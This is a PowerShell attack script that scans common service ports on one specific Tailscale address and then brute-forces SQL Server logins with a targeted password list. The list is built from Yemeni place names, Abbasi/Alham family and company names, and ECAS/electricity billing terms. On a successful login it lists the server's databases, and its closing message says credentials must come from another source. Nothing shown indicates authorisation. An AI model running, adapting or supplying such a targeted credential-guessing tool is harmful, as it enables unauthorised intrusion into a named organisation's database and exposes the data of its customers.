# Port scan + targeted SQL auth attempts (from local via Tailscale)

$target = '100.114.106.110'

Write-Host "[1/2] Scanning common ports on $target ..." -ForegroundColor Cyan

$ports = @{
    22    = 'SSH'
    80    = 'HTTP'
    135   = 'RPC'
    139   = 'NetBIOS'
    443   = 'HTTPS'
    445   = 'SMB'
    1433  = 'SQL'
    1434  = 'SQL Browser'
    3389  = 'RDP'
    5432  = 'Postgres'
    5985  = 'WinRM HTTP'
    5986  = 'WinRM HTTPS'
    8080  = 'HTTP Alt'
    3306  = 'MySQL'
    47001 = 'WinRM'
}

$jobs = @()
foreach ($p in $ports.GetEnumerator()) {
    $jobs += Start-Job -ScriptBlock {
        param($host1, $port, $svc)
        $tcp = New-Object System.Net.Sockets.TcpClient
        try {
            $result = $tcp.BeginConnect($host1, $port, $null, $null)
            $wait = $result.AsyncWaitHandle.WaitOne(1500, $false)
            if ($wait -and $tcp.Connected) {
                "OPEN $port ($svc)"
            }
            $tcp.Close()
        } catch {}
    } -ArgumentList $target, $p.Key, $p.Value
}
$jobs | Wait-Job -Timeout 5 | Out-Null
$jobs | ForEach-Object {
    $r = Receive-Job $_
    if ($r) { Write-Host "  $r" -ForegroundColor Green }
    Remove-Job $_ -Force
}

Write-Host ""
Write-Host "[2/2] Trying targeted SA passwords (Yemen/Abbasi/Alham context)..." -ForegroundColor Cyan

function Try-SaAuth {
    param($server, $user, $pw)
    $cs = "Server=$server;Database=master;User ID=$user;Password=$pw;Connection Timeout=3;TrustServerCertificate=true"
    try {
        $conn = New-Object System.Data.SqlClient.SqlConnection($cs)
        $conn.Open()
        Write-Host ("  [SUCCESS] " + $user + " / '" + $pw + "'") -ForegroundColor Green
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT name FROM sys.databases WHERE database_id > 4"
        $rd = $cmd.ExecuteReader()
        while ($rd.Read()) { Write-Host ("    DB: " + $rd.GetString(0)) -ForegroundColor Cyan }
        $rd.Close()
        $conn.Close()
        return $true
    } catch {
        return $false
    }
}

$server = "$target,1433"
$targetedPasswords = @(
    # Yemen-specific
    'yemen', 'Yemen', 'yemen123', 'Sana', 'Sanaa', 'Taiz',
    # Abbasi family / Company
    'abbasiy', 'Abbasiy', 'abbasy', 'Abbasy', 'ABBASI',
    'ABBASIY', 'ABBASIYSERVER', 'abbasiyserver', 'AbbasiyServer',
    'Alham', 'alham', 'ALHAM', 'Al-Ham', 'alhamm', 'Alhamm', 'alham123',
    'Elham', 'elham', 'ELHAM', 'Elham123',
    # Arabic transliteration
    'kahraba', 'Kahraba', 'kahraba123', 'kahrobaa',
    'fatora', 'Fatora', 'fatora123',
    'alkahrabaa', 'AlKahrabaa',
    # ECAS-specific
    'ECAS', 'ecas', 'ECAS123', 'ecas123', 'ecas@123', 'ECAS@123',
    'CustomerAccounts', 'Electricity', 'electricity',
    # Common Arabic
    'mohammed', 'Mohammed123', 'MohaMed', 'MohaMed123',
    'Mohamed', 'mohamed', 'Mohammed@123',
    # Common patterns
    'P@ssw0rd', 'P@ssword', 'p@ssword', 'p@ssw0rd',
    'Passw0rd', 'passw0rd', 'Pass@word1',
    # Year-based
    '2020', '2021', '2022', '2023', '2024', '2025', '2026',
    'admin2020', 'admin2021', 'admin@2020', 'admin@2021', 'admin@2022',
    'sa2020', 'sa2021', 'sa2022', 'sa@2020', 'sa@2021', 'sa@2022',
    # Simple patterns
    '!@#$%', '!QAZ2wsx', '1q2w3e4r', '1qaz2wsx', 'Aa1234', 'aa12345',
    'zxcvbnm', 'qazwsx', 'Welcome1', 'welcome1', 'changeme'
)

$success = $false
foreach ($pw in $targetedPasswords) {
    if (Try-SaAuth -server $server -user 'sa' -pw $pw) {
        $success = $true
        break
    }
}

if (-not $success) {
    # Also try common app usernames
    $userPass = @(
        @('admin','Admin@123'), @('admin','Admin123'), @('admin','alham'),
        @('ecas','Ecas@123'), @('ecas','ECAS@2020'),
        @('alham','alham'), @('Alham','Alham123'),
        @('administrator','Admin@123'), @('administrator','Alham@123')
    )
    foreach ($up in $userPass) {
        if (Try-SaAuth -server $server -user $up[0] -pw $up[1]) { $success = $true; break }
    }
}

if (-not $success) {
    Write-Host ""
    Write-Host "  None worked. Credentials must come from another source." -ForegroundColor Yellow
}
